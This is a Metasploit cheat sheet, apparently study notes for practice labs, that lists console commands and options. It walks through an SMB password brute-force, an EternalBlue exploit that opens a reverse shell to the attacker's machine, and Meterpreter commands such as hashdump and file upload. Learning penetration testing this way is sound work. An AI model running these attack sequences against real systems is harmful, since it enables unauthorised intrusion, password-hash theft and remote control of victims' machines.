# Metasploit Cheat Sheet

## Launch
```bash
sudo msfconsole
```

---

## Core Commands

| Command | Description |
|---|---|
| `search [term]` | Search for modules |
| `use [module]` | Load a module |
| `info` | Show info about loaded module |
| `show options` | Show required/optional settings |
| `show payloads` | Show compatible payloads for loaded exploit |
| `set [option] [value]` | Set an option |
| `unset [option]` | Clear an option |
| `run` or `exploit` | Execute the module |
| `back` | Exit current module |
| `exit` | Exit msfconsole |
| `help` | Show help |

---

## Common Options

| Option | Description |
|---|---|
| `RHOSTS` | Target IP(s) |
| `RPORT` | Target port |
| `LHOST` | Your IP (for reverse shells) |
| `LPORT` | Your listening port (for reverse shells) |
| `PAYLOAD` | Payload to use |
| `SMBUser` | Username for SMB modules |
| `PASS_FILE` | Path to password wordlist |
| `USER_FILE` | Path to username wordlist |

---

## Module Types

| Type | Description |
|---|---|
| `auxiliary` | Scanners, brute forcers, fuzzers — no shell |
| `exploit` | Attack code targeting a vulnerability |
| `payload` | Code that runs after exploit lands (shell, meterpreter) |
| `post` | Post-exploitation modules (run after you're in) |
| `encoder` | Obfuscates payloads to evade AV |

---

## Payload Types

| Type | Description |
|---|---|
| `shell_reverse_tcp` | Inline/single — self-contained, sends everything at once |
| `shell/reverse_tcp` | Staged — sends small stager first, pulls rest down after |
| `meterpreter/reverse_tcp` | Staged meterpreter — more features than a basic shell |

**Rule:** underscore = inline, slash = staged

---

## Common Workflows

```bash
# Search for a module
search eternalblue
search smb_login
search type:auxiliary scanner

# Load and configure a module
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.10.10.5
set SMBUser penny
set PASS_FILE /home/ross/Downloads/wordlist.txt
set STOP_ON_SUCCESS true
run

# EternalBlue (MS17-010)
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.5
set PAYLOAD windows/x64/shell/reverse_tcp
set LHOST 10.10.14.X
run
```

---

## Database Commands

```bash
# Start database (run outside msfconsole)
sudo systemctl start postgresql
sudo msfdb init

# Inside msfconsole
db_status               # Check database connection
db_nmap -sV 10.10.10.5 # Nmap scan that saves to DB
hosts                   # List discovered hosts
services                # List discovered services
workspace               # List workspaces
workspace -a thm        # Create new workspace
workspace thm           # Switch to workspace
```

---

## Meterpreter Basics (once you have a session)

| Command | Description |
|---|---|
| `sessions` | List active sessions |
| `sessions -i 1` | Interact with session 1 |
| `sysinfo` | Target system info |
| `getuid` | Current user |
| `hashdump` | Dump password hashes |
| `shell` | Drop into system shell |
| `upload [file]` | Upload file to target |
| `download [file]` | Download file from target |
| `run post/[module]` | Run post-exploitation module |

---

## Notes
- Pre-built shells on Kali: `/usr/share/webshells/`
- Always set `STOP_ON_SUCCESS true` for brute force modules
- Use `db_nmap` instead of regular nmap to auto-save results
